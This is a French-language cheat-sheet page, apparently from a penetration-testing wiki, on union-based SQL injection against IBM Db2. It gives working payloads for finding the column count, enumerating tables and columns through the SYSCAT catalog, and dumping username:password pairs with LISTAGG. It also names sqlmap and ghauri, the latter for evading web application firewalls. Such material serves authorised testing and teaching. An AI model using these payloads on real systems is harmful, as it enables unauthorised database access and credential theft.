---
order: 7
title: "Injection SQL basée sur union dans IBM Db2"
description: "Ajouter UNION SELECT dans IBM Db2 pour extraire des données, en utilisant SYSIBM.SYSDUMMY1, la correspondance stricte des types, le catalogue SYSCAT et LISTAGG."
keywords:
  - injection SQL basée sur union
  - UNION SELECT SYSDUMMY1
  - SYSCAT.TABLES
  - LISTAGG
  - extraction Db2
---

# Basée sur union

Un `UNION SELECT` ajoute des lignes choisies par l'attaquant à un résultat retourné. Db2 requiert un `FROM`, donc une sélection de ligne unique injectée lit `FROM SYSIBM.SYSDUMMY1`, et les nombres et types de colonnes doivent correspondre à l'original, avec `NULL` comme valeur de remplissage agnostique de type (Db2 peut être strict sur la correspondance des types, donc castez au besoin).

Détectez le nombre de colonnes avec des ordinaux `ORDER BY` ou des `UNION SELECT NULL` incrémentaux :

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL FROM SYSIBM.SYSDUMMY1-- 
```

Un nombre erroné lève `SQL0421N` (les opérandes d'une opération ensembliste n'ont pas le même nombre de colonnes). La disposition trouvée, énumérez via `SYSCAT` :

```sql
' UNION SELECT TABNAME,NULL,NULL FROM SYSCAT.TABLES WHERE TABSCHEMA=CURRENT SCHEMA-- 
' UNION SELECT COLNAME,NULL,NULL FROM SYSCAT.COLUMNS WHERE TABNAME='USERS'-- 
```

Regroupez les lignes en une seule cellule avec `LISTAGG` (Db2 9.7+) :

```sql
' UNION SELECT LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM users-- 
```

Les noms du catalogue sont en majuscules, faites donc correspondre `TABNAME='USERS'` en majuscules. Pour une seule ligne, utilisez `FETCH FIRST 1 ROWS ONLY`. Là où `LISTAGG` est indisponible, `XMLAGG` réalise la même agrégation, sur laquelle la page DIOS s'appuie.

## Outils

- **sqlmap** : automatise la détection du nombre de colonnes et l'extraction UNION (`--technique=U`).
- **ghauri** : alternative rapide avec forte évasion de WAF.
- **db2** (ou clpplus) : le client Db2 pour valider `UNION SELECT ... FROM SYSIBM.SYSDUMMY1`.

## Références

- IBM Db2 SQL Reference : fullselect, SYSCAT catalog, LISTAGG, SYSIBM.SYSDUMMY1
- OWASP Testing Guide : Testing for SQL Injection
